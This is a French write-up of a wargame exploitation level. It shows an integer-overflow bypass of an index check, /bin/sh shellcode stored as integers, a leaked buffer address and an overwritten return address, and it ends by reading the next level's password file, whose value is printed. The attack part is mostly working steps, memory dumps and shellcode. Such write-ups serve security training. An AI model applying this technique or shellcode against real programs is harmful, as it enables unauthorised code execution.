Dans ce niveau nous allons nous servir du buffer present dans le main pour overflow et reecrire l'EIP de sortie du main
int main(int ac, char **av, char **env)
{
    char fbuffer[100];
}

la fonction store_number ecrit le nombre qu'on lui donne à l'index qu'on lui donne directement dans fbuffer.
    printf(" Number: ");
    num = get_unum();
    printf(" Index: ");
    id = get_unum();
    if ((id % 3 == 0) || (num >> 24 == 183)) {
        puts(" *** ERROR! ***");

en regardans la memoire nous pouvons savoir l'index de l'EIP


0xffffd510:	0x00000098	0xffffffff	0xffffd7e4	0xffffd788
0xffffd520:	0x00000000	0x6850c031	0x68732f2f	0x69622f68 [x] [S] [] []
0xffffd530:	0x89e3896e	0xb0c289c1	0x3180cd0b	0x80cd40c0
0xffffd540:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd550:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd560:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd570:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd580:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd590:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd5a0:	0x00000000	0x00000000	0x00000000	0x00000000		^
0xffffd5b0:	0x00000000	0x00000000	0x00000000	0x00000000      |
0xffffd5c0:	0x00000000	0x00000000	0x00000000	0x00000000      |  114 * 4 octects de long
0xffffd5d0:	0x00000000	0x00000000	0x00000000	0x00000000      |
0xffffd5e0:	0x00000000	0x00000000	0x00000000	0x00000000		^
0xffffd5f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd600:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd610:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd620:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd630:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd640:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd690:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6c0:	0x00000000	0x00000000	0x00000000	0xcc9d5500
0xffffd6d0:	0xf7feb620	0x00000000	0x08048a09	0xf7fceff4
0xffffd6e0:	0x00000000	0x00000000	0x00000000	0xf7e45513 [] [] [] [EIP]

Si on ecrit à l'index 114 du buffer cela changera l'EIP
malheuresement il s'agit d'un index protégé.
On va donc se servir de l'overflow du max int pour atteindre l'index 114 mais a l'aide d'un autre chiffre
114 = 4294967296 / 4 + 114 = 1073741938

une fois l'EIP trouvé nous allons le faire pointer sur un shellcode /bin/bash malheuresement l'env et vider au debut du programme ce qui nous empeche de le mettre dedans
nous allons donc nous servir des espaces memoires donné pour y stocker le shellcode.


shellcode \x31\xc0\x50\x68 \x2f\x2f\x73\x68 \x68\x2f\x62\x69 \x6e\x89\xe3\x89 \xc1\x89\xc2\xb0 \x0b\xcd\x80\x31 \xc0\x40\xcd\x80
nous allons les convertir en suite d'int
0x6850c031 <--> 1750122545
0x68732f2f <--> 1752379183
0x69622f68 <--> 1768042344
0x89e3896e <--> 2313390446
0xb0c289c1 <--> 2965539265
0x3180cd0b <--> 830524683
0x80cd40c0 <--> 2160935104
et les stocker au index 0-6 inclus du tableau.

Input command: store
 Number: 1750122545
 Index: 1073741824
 Completed store command successfully
Input command: store
 Number: 1752379183
 Index: 1
 Completed store command successfully
Input command: store
 Number: 1768042344
 Index:  2
 Completed store command successfully
Input command: store
 Number: 2313390446
 Index: 1073741827
 Completed store command successfully
Input command: store
 Number: 2965539265
 Index: 4
 Completed store command successfully
Input command: store
 Number: 830524683
 Index: 5
 Completed store command successfully
Input command: store
 Number:  2160935104
 Index: 1073741830
 Completed store command successfully

une fois le shellcode stocker il nous faut savoir ou il sera stocker. Son emplacement etant different lorsque le programme et lancer a l'aide de GDB ou seul
nous allons nous servir de la fonction read.


en regardant la memoire suite a l'appel de la fonction read on peux remarquer
0xffffd4f8:	0xffffd6e8	0x08048930	0xffffd524	0x00000014 [EBP] [EIP] [TAB ADDR] []
0xffffd508:	0xf7fcfac0	0xf7fdc714	0x00000098	0xffffffff
0xffffd518:	0xffffd7e4	0xffffd788	0x00000000	0x6850c031 [] [] [] [TAB S]

on vois que l'adresse du tableau et inscrit 9 cases avant le debut de ce dernier il nous suffit donc :
Input command: read
 Index: -9
 Number at data[4294967287] is 4294956356
 Completed read command successfully
pour obtenir la valeur de debut du tableau et donc de notre shellcode.

il nous suffit donc de le mettre a la place de l'EIP
Input command: store
 Number: 4294956356
 Index: 1073741938
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC